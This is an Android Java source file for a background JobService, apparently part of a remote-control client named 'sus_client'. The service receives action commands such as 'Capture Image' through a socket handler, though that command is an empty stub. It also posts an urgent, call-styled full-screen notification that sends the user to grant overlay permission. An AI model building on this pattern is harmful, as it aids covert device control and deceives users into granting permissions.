package com.android.sus_client.services;

import static com.android.sus_client.services.ForegroundService.NOTIFICATION_ICON_RES;
import static com.android.sus_client.services.ForegroundService.NOTIFICATION_MSG;
import static com.android.sus_client.services.ForegroundService.NOTIFICATION_TITLE;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.media.AudioAttributes;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.PersistableBundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import com.android.sus_client.annotation.Nullable;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.Utils;

import org.json.JSONObject;


/**
 * JobService to be scheduled by the JobScheduler.
 * start another service
 */
@SuppressLint("SpecifyJobSchedulerIdRange")
public class WorkService extends JobService {

    private String actionCmd = "";
    private JSONObject actionData = new JSONObject();
    private boolean resStatus = false;
    private String resMessage = null;
    private JSONObject resData = null;

    private SocketHandler socketHandler;

    public WorkService() {
        //androidx.work.Configuration.Builder builder = new androidx.work.Configuration.Builder();
        //builder.setJobSchedulerJobIdRange(0, 1000);
    }

    @Override
    public boolean onStartJob(JobParameters params) {
        socketHandler = SocketHandler.getInstance(getApplicationContext());

        startActivitys();
        try {
            actionCmd = params.getExtras().getString("action", "");
            actionData = new JSONObject(params.getExtras().getString("data", "{}"));
        } catch (Exception ignored) {
        }
        //schedulerJob(getApplicationContext(), new PersistableBundle());
        Toast.makeText(getApplicationContext(), "Bg Service " + actionCmd, Toast.LENGTH_SHORT).show();
        Toast.makeText(this, Utils.isAppInForeground() + " : " + Utils.isAppInForeground(getApplicationContext()), Toast.LENGTH_LONG).show();

        switch (actionCmd) {
            case "Capture Image":

                break;
            default:
                break;
        }

        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }

    // schedule the start of the service every 10 - 30 seconds
    public static void schedulerJob(Context context, @Nullable PersistableBundle bundle) {
        ComponentName serviceComponent = new ComponentName(context, WorkService.class);
        JobInfo.Builder builder = new JobInfo.Builder(0, serviceComponent);
        builder.setMinimumLatency(1000);    // wait at least
        builder.setOverrideDeadline(3 * 1000);  //delay time
        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED);  // require undeterred network
        builder.setRequiresCharging(false);  // we don't care if the device is charging or not
        builder.setRequiresDeviceIdle(true); // device should be idle
        builder.setExtras(bundle);      // pass the PersistableBundle

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
            jobScheduler.schedule(builder.build());
        }
    }

    private void startActivitys() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

            Notification notification = createNotification().build();
            notificationManager.notify(NOTIFICATION_ID, notification);
        } else {
            //startActivity(new Intent(BackgroundService.this, LoginActivity.class).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
    }

    @SuppressLint("LaunchActivityFromNotification")
    private NotificationCompat.Builder createNotification() {
        Log.e("createNotification", "createNotification");
        Intent fullScreenIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        //Intent fullScreenIntent = new Intent(this, LoginActivity.class);
        //fullScreenIntent.putExtra("NOTIFICATION_ID", NOTIFICATION_ID);

        PendingIntent pendingIntent = PendingIntent.getService(this, 0, fullScreenIntent, Utils.getPendingIntentFlag());
        return new NotificationCompat.Builder(this, createNotificationChannel())
                .setSmallIcon(NOTIFICATION_ICON_RES)
                .setContentTitle(NOTIFICATION_TITLE)
                .setContentText(NOTIFICATION_MSG)
                .setPriority(Notification.PRIORITY_HIGH)
                .setCategory(Notification.CATEGORY_CALL)
                .setFullScreenIntent(pendingIntent, true)
                .setAutoCancel(true)
                .setOngoing(true);
    }

    private String createNotificationChannel() {
        Uri sound = RingtoneManager.getActualDefaultRingtoneUri(getApplicationContext(), RingtoneManager.TYPE_NOTIFICATION);
        AudioAttributes attributes = new AudioAttributes.Builder()
                .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                .setUsage(AudioAttributes.USAGE_ALARM)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = WorkService.class.getSimpleName();
            NotificationChannel channel = new NotificationChannel(channelId, ApkUtils.getApplicationName(this), NotificationManager.IMPORTANCE_HIGH);
            //channel.setImportance(NotificationManager.IMPORTANCE_NONE);
            //channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setSound(sound, attributes);
            notificationManager.createNotificationChannel(channel);
            return channelId;
        }
        return "";
    }

    private NotificationManager notificationManager;
    private static final int NOTIFICATION_ID = 786642;

}